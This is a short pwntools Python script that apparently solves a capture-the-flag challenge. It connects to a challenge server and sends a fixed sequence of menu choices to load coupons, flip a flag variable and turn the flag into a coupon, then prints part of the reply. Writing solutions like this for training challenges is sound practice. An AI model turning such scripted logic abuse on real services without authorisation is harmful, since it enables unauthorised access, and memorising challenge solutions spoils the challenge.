#!/usr/bin/python3

from pwn import *

io = remote("csa.csa-challenge.com", 1111)
context.log_level = 'error'

# Load Coupons
io.recv()
io.sendline(b'5')
io.recv()
io.sendline(b' ')
io.recv()

# Change Flag To True
io.sendline(b'2')
io.recv()
io.sendline(b'1')
io.recv()
io.sendline(b'2')
io.recv()
io.sendline(b'1')
io.recv()

# Turn Flag Into Coupon
io.sendline(b'2')
io.recv()
io.sendline(b'1')
io.recv()
io.sendline(b'3')
io.recv()
io.sendline(b'0')
io.recv()
io.sendline(b'2')
io.recv()
io.sendline(b'1')
io.recv()

# Check Coupon Letter
io.sendline(b'4')
print(io.recv().split()[13])
io.close()
